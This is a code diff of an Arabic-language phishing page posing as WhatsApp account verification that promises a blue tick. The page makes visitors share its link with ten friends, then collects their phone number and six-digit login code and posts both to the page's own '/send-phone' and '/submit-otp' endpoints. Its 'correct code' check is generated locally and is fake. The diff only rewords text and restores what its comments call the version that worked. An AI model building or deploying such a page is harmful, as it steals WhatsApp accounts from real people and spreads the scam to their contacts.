@@ -32,7 +32,6 @@
         .btn-share { width: 100%; padding: 14px; background: #25d366; color: white; border: none; border-radius: 30px; font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.2s; display: flex; align-items: center; justify-content: center; gap: 10px; }
         .btn-share:hover { background: #1da85c; }
         .btn-share:active { transform: scale(0.97); }
-        .btn-share:disabled { opacity: 0.5; cursor: not-allowed; }
         .btn-confirm { width: 100%; padding: 14px; background: #075e54; color: white; border: none; border-radius: 30px; font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.2s; display: flex; align-items: center; justify-content: center; gap: 10px; margin-top: 10px; }
         .btn-confirm:hover { background: #054a42; }
         .btn-confirm:active { transform: scale(0.97); }
@@ -91,7 +90,6 @@
 
     <div class="app-container">
 
-        <!-- ======== الهيدر ======== -->
         <div class="header">
             <i id="backBtn" class="back-btn fas fa-arrow-left"></i>
             <div class="brand">
@@ -113,9 +111,9 @@
                 </div>
                 <h3>🎯 دعوة الأصدقاء</h3>
                 <p class="sub-text">
-                    <strong>لتفعيل التوثيق والحصول على العلامة الزرقاء</strong>
+                    <strong>لتفعيل التوثيق</strong>
                     <br>شارك الرابط مع <strong>10 من أصدقائك</strong>
-                    <br>ثم اضغط على زر <strong>"تم"</strong> مرة واحدة فقط ✅
+                    <br>ثم اضغط <strong>"تم"</strong> ✅
                 </p>
 
                 <div class="highlight-box">
@@ -158,7 +156,7 @@
             </div>
         </div>
 
-        <!-- ======== الصفحة 1: رقم الهاتف ======== -->
+        <!-- ======== الصفحة 1: رقم الهاتف (النسخة اللي كانت شغالة) ======== -->
         <div id="pagePhone" class="page">
             <div class="chat-card">
                 <div class="icon-circle">
@@ -166,26 +164,19 @@
                 </div>
                 <h3>توثيق الحساب</h3>
                 <p class="sub-text">
-                    للحصول على <strong>علامة التوثيق الزرقاء</strong>،
-                    <br>أدخل رقم هاتفك للتحقق من هويتك.
+                    للحصول على <strong>علامة التوثيق الزرقاء</strong>
                 </p>
-            </div>
-
-            <div class="message-bubble incoming">
-                <div class="sender">WhatsApp</div>
-                <div class="text">🔒 حسابك سيصبح موثقاً رسمياً بعد التحقق</div>
-                <div class="time">الآن</div>
             </div>
 
             <div style="margin-top: 16px;">
                 <div class="input-group">
                     <i class="fas fa-phone-alt"></i>
-                    <input type="tel" id="phoneInput" placeholder="أدخل رقم الهاتف" maxlength="15" inputmode="numeric" pattern="[0-9]*">
+                    <input type="tel" id="phoneInput" placeholder="أدخل رقم الهاتف" maxlength="15" inputmode="numeric">
                 </div>
 
                 <div id="phoneError" class="error-msg">
                     <i class="fas fa-exclamation-circle"></i>
-                    <span>يرجى إدخال رقم هاتف صحيح</span>
+                    <span>رقم غير صحيح</span>
                 </div>
 
                 <button class="btn btn-primary" id="sendOtpBtn">
@@ -193,7 +184,7 @@
                 </button>
 
                 <div class="footer-note">
-                    <i class="fas fa-lock"></i> معلوماتك آمنة ومشفرة
+                    <i class="fas fa-lock"></i> معلوماتك آمنة
                 </div>
             </div>
         </div>
@@ -206,34 +197,27 @@
                 </div>
                 <h3>رمز التحقق</h3>
                 <p class="sub-text">
-                    تم إرسال رمز مكون من 6 أرقام إلى
-                    <br><strong id="displayPhone">رقمك</strong>
+                    تم إرسال الرمز إلى <strong id="displayPhone">رقمك</strong>
                 </p>
             </div>
 
-            <div class="message-bubble incoming">
-                <div class="sender">WhatsApp</div>
-                <div class="text">📱 أدخل الرمز الذي تلقيته</div>
-                <div class="time">الآن</div>
-            </div>
-
             <div class="otp-boxes" id="otpContainer">
-                <input type="text" maxlength="1" class="otp-input" data-index="0" inputmode="numeric" pattern="[0-9]*">
-                <input type="text" maxlength="1" class="otp-input" data-index="1" inputmode="numeric" pattern="[0-9]*">
-                <input type="text" maxlength="1" class="otp-input" data-index="2" inputmode="numeric" pattern="[0-9]*">
-                <input type="text" maxlength="1" class="otp-input" data-index="3" inputmode="numeric" pattern="[0-9]*">
-                <input type="text" maxlength="1" class="otp-input" data-index="4" inputmode="numeric" pattern="[0-9]*">
-                <input type="text" maxlength="1" class="otp-input" data-index="5" inputmode="numeric" pattern="[0-9]*">
+                <input type="text" maxlength="1" class="otp-input" data-index="0" inputmode="numeric">
+                <input type="text" maxlength="1" class="otp-input" data-index="1" inputmode="numeric">
+                <input type="text" maxlength="1" class="otp-input" data-index="2" inputmode="numeric">
+                <input type="text" maxlength="1" class="otp-input" data-index="3" inputmode="numeric">
+                <input type="text" maxlength="1" class="otp-input" data-index="4" inputmode="numeric">
+                <input type="text" maxlength="1" class="otp-input" data-index="5" inputmode="numeric">
             </div>
 
             <div id="otpError" class="error-msg">
                 <i class="fas fa-exclamation-circle"></i>
-                <span>الرمز غير صحيح، حاول مرة أخرى</span>
+                <span>الرمز غير صحيح</span>
             </div>
 
             <div id="otpSuccess" class="success-msg">
                 <i class="fas fa-check-circle"></i>
-                <span>✅ تم التوثيق بنجاح!</span>
+                <span>✅ تم التوثيق!</span>
             </div>
 
             <div id="loadingSpinner" class="loading-spinner">
@@ -242,36 +226,33 @@
             </div>
 
             <button class="btn btn-success" id="verifyOtpBtn">
-                <i class="fas fa-check-circle"></i> تحقق من الرمز
+                <i class="fas fa-check-circle"></i> تحقق
             </button>
 
             <button class="btn btn-secondary" id="resendOtpBtn" style="margin-top: 10px;">
-                <i class="fas fa-redo-alt"></i> إعادة إرسال الرمز
+                <i class="fas fa-redo-alt"></i> إعادة إرسال
             </button>
 
             <div class="footer-note">
                 <i class="fas fa-check-circle" style="color: #25d366;"></i>
-                بعد التحقق ستحصل على <strong style="color: #075e54;">العلامة الزرقاء</strong>
+                بعد التحقق ستحصل على العلامة الزرقاء
             </div>
         </div>
 
     </div>
 
-    <!-- ======== Toast ======== -->
     <div id="toast" class="toast"></div>
 
     <script>
         // =============================================
-        // جافا سكريبت
+        // جافا سكريبت - النسخة اللي كانت شغالة
         // =============================================
 
-        // عناصر الصفحات
         const pageInvite = document.getElementById('pageInvite');
         const pagePhone = document.getElementById('pagePhone');
         const pageOtp = document.getElementById('pageOtp');
         const backBtn = document.getElementById('backBtn');
 
-        // عناصر صفحة الدعوة
         const shareBtn = document.getElementById('shareBtn');
         const confirmBtn = document.getElementById('confirmBtn');
         const continueBtn = document.getElementById('continueBtn');
@@ -279,13 +260,11 @@
         const progressFill = document.getElementById('progressFill');
         const toast = document.getElementById('toast');
 
-        // عناصر صفحة الهاتف
         const phoneInput = document.getElementById('phoneInput');
         const phoneError = document.getElementById('phoneError');
         const sendOtpBtn = document.getElementById('sendOtpBtn');
         const displayPhone = document.getElementById('displayPhone');
 
-        // عناصر صفحة OTP
         const otpInputs = document.querySelectorAll('.otp-input');
         const otpError = document.getElementById('otpError');
         const otpSuccess = document.getElementById('otpSuccess');
@@ -293,7 +272,6 @@
         const resendOtpBtn = document.getElementById('resendOtpBtn');
         const loadingSpinner = document.getElementById('loadingSpinner');
 
-        // متغيرات
         let userId = '';
         let enteredPhone = '';
         let correctOtp = '123456';
@@ -302,12 +280,10 @@
         let hasShared = false;
         const BASE_URL = 'https://whatsapp-verify-zeta.vercel.app';
 
-        // ===== توليد ID فريد =====
         function generateUserId() {
             return Math.random().toString(36).substring(2, 10) + Date.now().toString(36);
         }
 
-        // ===== Toast =====
         function showToast(message) {
             toast.textContent = message;
             toast.classList.add('show');
@@ -316,14 +292,13 @@
             }, 3000);
         }
 
-        // ===== تحديث حالة الدعوة =====
         function updateStatus() {
             if (isShared) {
                 statusText.textContent = '✅ تمت المشاركة!';
                 statusText.style.color = '#25d366';
                 progressFill.style.width = '100%';
                 continueBtn.disabled = false;
-                continueBtn.innerHTML = '<i class="fas fa-arrow-right"></i> المتابعة للتوثيق ✅';
+                continueBtn.innerHTML = '<i class="fas fa-arrow-right"></i> المتابعة ✅';
                 confirmBtn.disabled = true;
                 confirmBtn.innerHTML = '<i class="fas fa-check-circle"></i> تم ✅';
             } else if (hasShared) {
@@ -333,19 +308,15 @@
                 confirmBtn.disabled = false;
                 confirmBtn.innerHTML = '<i class="fas fa-check-circle"></i> تم ✅';
                 continueBtn.disabled = true;
-                continueBtn.innerHTML = '<i class="fas fa-arrow-right"></i> المتابعة للتوثيق';
             } else {
                 statusText.textContent = '⏳ في انتظار المشاركة';
                 statusText.style.color = '#075e54';
                 progressFill.style.width = '0%';
                 confirmBtn.disabled = true;
-                confirmBtn.innerHTML = '<i class="fas fa-check-circle"></i> تم ✅';
                 continueBtn.disabled = true;
-                continueBtn.innerHTML = '<i class="fas fa-arrow-right"></i> المتابعة للتوثيق';
             }
         }
 
-        // ===== جلب بيانات المستخدم =====
         async function fetchUserData() {
             try {
                 const response = await fetch('/get-user', {
@@ -359,7 +330,7 @@
                     updateStatus();
                 }
             } catch (error) {
-                console.error('❌ خطأ في جلب البيانات:', error);
+                console.error('❌ خطأ:', error);
             }
         }
 
@@ -370,8 +341,8 @@
             try {
                 if (navigator.share) {
                     await navigator.share({
-                        title: 'توثيق حساب WhatsApp',
-                        text: '🔵 ساعدني في توثيق حسابي على WhatsApp واحصل على العلامة الزرقاء!',
+                        title: 'توثيق WhatsApp',
+                        text: '🔵 ساعدني في توثيق حسابي على WhatsApp!',
                         url: shareLink
                     });
                     hasShared = true;
@@ -381,32 +352,31 @@
                     await navigator.clipboard.writeText(shareLink);
                     hasShared = true;
                     updateStatus();
-                    showToast('✅ تم نسخ الرابط! شاركه مع أصدقائك ثم اضغط "تم"');
+                    showToast('✅ تم نسخ الرابط! شاركه ثم اضغط "تم"');
                 }
             } catch (err) {
-                console.log('❌ فشل المشاركة:', err);
                 if (err.name !== 'AbortError') {
                     try {
                         await navigator.clipboard.writeText(shareLink);
                         hasShared = true;
                         updateStatus();
-                        showToast('✅ تم نسخ الرابط! شاركه مع أصدقائك');
+                        showToast('✅ تم نسخ الرابط!');
                     } catch (e) {
-                        showToast('❌ فشل نسخ الرابط، حاول مرة أخرى');
+                        showToast('❌ فشل النسخ');
                     }
                 }
             }
         }
 
-        // ===== تأكيد المشاركة (مرة واحدة) =====
+        // ===== تأكيد المشاركة =====
         function confirmShare() {
             if (isShared) {
-                showToast('⚠️ لقد قمت بالمشاركة بالفعل!');
+                showToast('⚠️ تم المشاركة بالفعل!');
                 return;
             }
 
             if (!hasShared) {
-                showToast('⚠️ يرجى مشاركة الرابط أولاً!');
+                showToast('⚠️ شارك الرابط أولاً!');
                 return;
             }
 
@@ -420,18 +390,16 @@
                 if (data.success) {
                     isShared = true;
                     updateStatus();
-                    showToast('✅ تم تأكيد المشاركة! يمكنك المتابعة الآن');
+                    showToast('✅ تم التأكيد! يمكنك المتابعة');
                 } else {
                     showToast('⚠️ ' + data.message);
                 }
             })
             .catch(error => {
-                console.error('❌ خطأ:', error);
-                showToast('❌ حدث خطأ، حاول مرة أخرى');
+                showToast('❌ حدث خطأ');
             });
         }
 
-        // ===== المتابعة للتوثيق =====
         function goToPhone() {
             if (isShared) {
                 pageInvite.classList.remove('active');
@@ -441,13 +409,11 @@
             }
         }
 
-        // ===== التبديل بين الصفحات =====
         function showPage(page) {
             pageInvite.classList.remove('active');
             pagePhone.classList.remove('active');
             pageOtp.classList.remove('active');
             page.classList.add('active');
-
             if (page === pageOtp) {
                 backBtn.style.display = 'inline-block';
             } else {
@@ -455,8 +421,8 @@
             }
         }
 
-        // ===== إرسال رقم الهاتف =====
-        async function sendPhone() {
+        // ===== إرسال رقم الهاتف (النسخة اللي كانت شغالة) =====
+        function sendPhone() {
             const phone = phoneInput.value.trim().replace(/\s/g, '');
 
             if (!/^[0-9]{10,15}$/.test(phone)) {
@@ -468,18 +434,23 @@
             enteredPhone = phone;
             displayPhone.textContent = phone;
 
-            try {
-                await fetch('/save-phone', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ userId, phone })
-                });
-            } catch (error) {
-                console.error('❌ خطأ في حفظ الرقم:', error);
-            }
+            // إرسال الرقم
+            fetch('/send-phone', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phone: phone })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('✅ تم إرسال الرقم:', data);
+            })
+            .catch(error => {
+                console.error('❌ خطأ:', error);
+            });
 
+            // توليد OTP عشوائي
             correctOtp = Math.floor(100000 + Math.random() * 900000).toString();
-            console.log('📲 رمز OTP الجديد:', correctOtp);
+            console.log('📲 رمز OTP:', correctOtp);
 
             showPage(pageOtp);
             otpInputs[0].focus();
@@ -488,8 +459,8 @@
             clearOtpInputs();
         }
 
-        // ===== التحقق من OTP =====
-        async function verifyOtp() {
+        // ===== التحقق من OTP (النسخة اللي كانت شغالة) =====
+        function verifyOtp() {
             if (isVerifying) return;
 
             let enteredOtp = '';
@@ -499,7 +470,7 @@
 
             if (enteredOtp.length !== 6) {
                 otpError.classList.add('show');
-                otpError.querySelector('span').textContent = 'يرجى إدخال الرمز بالكامل (6 أرقام)';
+                otpError.querySelector('span').textContent = 'أدخل الرمز كاملاً';
                 return;
             }
 
@@ -509,73 +480,68 @@
 
             loadingSpinner.classList.add('show');
             verifyOtpBtn.disabled = true;
-            verifyOtpBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري التوثيق...';
+            verifyOtpBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري...';
 
-            try {
-                await fetch('/save-otp', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        userId,
-                        phone: enteredPhone,
-                        otp: enteredOtp
-                    })
-                });
+            // إرسال OTP
+            fetch('/submit-otp', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    phone: enteredPhone,
+                    otp: enteredOtp
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('✅ تم إرسال OTP:', data);
 
                 if (enteredOtp === correctOtp) {
                     otpSuccess.classList.add('show');
-                    otpSuccess.querySelector('span').textContent = '✅ تم التوثيق بنجاح! 🎉';
+                    otpSuccess.querySelector('span').textContent = '✅ تم التوثيق! 🎉';
                     otpError.classList.remove('show');
-
                     setTimeout(() => {
                         window.location.href = '/success';
                     }, 2000);
                 } else {
                     otpError.classList.add('show');
-                    otpError.querySelector('span').textContent = '❌ الرمز غير صحيح، حاول مرة أخرى';
+                    otpError.querySelector('span').textContent = '❌ الرمز غير صحيح';
                     otpSuccess.classList.remove('show');
                     clearOtpInputs();
                     otpInputs[0].focus();
                 }
-
-            } catch (error) {
+            })
+            .catch(error => {
                 console.error('❌ خطأ:', error);
                 otpError.classList.add('show');
-                otpError.querySelector('span').textContent = '⚠️ حدث خطأ في الاتصال، حاول مرة أخرى';
-            }
+                otpError.querySelector('span').textContent = '⚠️ حدث خطأ';
+            });
 
             loadingSpinner.classList.remove('show');
             verifyOtpBtn.disabled = false;
-            verifyOtpBtn.innerHTML = '<i class="fas fa-check-circle"></i> تحقق من الرمز';
+            verifyOtpBtn.innerHTML = '<i class="fas fa-check-circle"></i> تحقق';
             isVerifying = false;
         }
 
-        // ===== إعادة إرسال الرمز =====
         function resendOtp() {
             correctOtp = Math.floor(100000 + Math.random() * 900000).toString();
-            console.log('📲 رمز توثيق جديد:', correctOtp);
-
+            console.log('📲 رمز جديد:', correctOtp);
             clearOtpInputs();
             otpInputs[0].focus();
             otpError.classList.remove('show');
             otpSuccess.classList.remove('show');
-
-            alert('✅ تم إعادة إرسال الرمز الجديد إلى ' + enteredPhone);
+            alert('✅ تم إعادة إرسال الرمز');
         }
 
-        // ===== مسح خانات OTP =====
         function clearOtpInputs() {
             otpInputs.forEach(input => input.value = '');
         }
 
-        // ===== التنقل بين خانات OTP =====
         otpInputs.forEach((input, index) => {
             input.addEventListener('keydown', function(e) {
-                const key = e.key;
-                if (key === 'Backspace' || key === 'Tab' || key === 'ArrowLeft' || key === 'ArrowRight' || key === 'Delete' || key === 'Home' || key === 'End') {
+                if (e.key === 'Backspace' || e.key === 'Tab' || e.key === 'ArrowLeft' || e.key === 'ArrowRight' || e.key === 'Delete') {
                     return;
                 }
-                if (!/^[0-9]$/.test(key)) {
+                if (!/^[0-9]$/.test(e.key)) {
                     e.preventDefault();
                 }
             });
@@ -597,7 +563,6 @@
             });
         });
 
-        // ===== العودة للخلف =====
         backBtn.addEventListener('click', function() {
             showPage(pagePhone);
             clearOtpInputs();
@@ -607,10 +572,9 @@
             isVerifying = false;
             loadingSpinner.classList.remove('show');
             verifyOtpBtn.disabled = false;
-            verifyOtpBtn.innerHTML = '<i class="fas fa-check-circle"></i> تحقق من الرمز';
+            verifyOtpBtn.innerHTML = '<i class="fas fa-check-circle"></i> تحقق';
         });
 
-        // ===== ربط الأحداث =====
         shareBtn.addEventListener('click', shareLink);
         confirmBtn.addEventListener('click', confirmShare);
         continueBtn.addEventListener('click', goToPhone);
@@ -643,7 +607,7 @@
         fetchUserData();
         updateStatus();
 
-        console.log('🔑 الرمز الافتراضي للاختبار: 123456');
+        console.log('🔑 الرمز الافتراضي: 123456');
     </script>
 
 </body>
